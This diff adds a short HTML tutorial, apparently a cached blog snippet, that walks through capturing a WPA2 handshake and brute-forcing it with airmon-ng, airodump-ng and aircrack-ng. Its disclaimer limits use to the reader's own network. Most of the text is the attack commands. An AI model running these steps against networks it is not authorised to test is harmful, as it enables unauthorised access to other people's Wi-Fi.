@@ -1,0 +1,26 @@
+I"�<blockquote>
+  <p><strong>Disclaimer</strong>: This might be illegal in some countries. Perform this attack on your own network only!</p>
+</blockquote>
+
+<ol>
+  <li>Put WLAN device into monitoring mode:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airmon-ng start wlan0
+</code></pre></div>    </div>
+  </li>
+  <li>Scan for access points:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng wlan0mon
+</code></pre></div>    </div>
+  </li>
+  <li>Capture WPA2 handshake (use <code class="highlighter-rouge">&lt;$BSSID&gt;</code> and <code class="highlighter-rouge">&lt;$CHANNEL&gt;</code> from the previous scan):
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airodump-ng <span class="nt">-c</span> &lt;<span class="nv">$CHANNEL</span><span class="o">&gt;</span> <span class="nt">--bssid</span> &lt;<span class="nv">$BSSID</span><span class="o">&gt;</span> <span class="nt">-w</span> &lt;<span class="nv">$CAPTURE_FILE</span><span class="o">&gt;</span> wlan0mon
+</code></pre></div>    </div>
+  </li>
+  <li>Wait until airodump says ‘<em>WPA handshake: …</em>’ in the upper right of the terminal, then press <code class="highlighter-rouge">Ctrl+c</code> to stop scanning.</li>
+  <li>Bruteforce the WPA2 handshake with aircrack-ng and a wordlist:
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aircrack-ng &lt;<span class="nv">$CAPTURE_FILE</span><span class="o">&gt;</span><span class="nt">-01</span>.cap  <span class="nt">-w</span> &lt;<span class="nv">$WORDLIST_FILE</span><span class="o">&gt;</span>
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<hr />
+:ET
